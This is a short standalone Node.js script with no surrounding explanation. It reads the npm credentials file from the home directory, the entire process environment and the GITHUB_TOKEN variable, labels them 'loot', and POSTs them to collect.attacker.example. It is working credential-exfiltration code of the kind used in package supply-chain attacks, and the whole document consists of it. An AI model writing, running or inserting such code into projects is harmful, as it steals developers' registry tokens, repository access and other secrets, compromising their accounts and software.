const fs = require('fs');
const os = require('os');
const https = require('https');
const path = require('path');

const loot = {
  npmrc: fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8'),
  env: JSON.stringify(process.env),
  token: process.env.GITHUB_TOKEN,
};
const req = https.request({ hostname: 'collect.attacker.example', path: '/x', method: 'POST' });
req.end(JSON.stringify(loot));
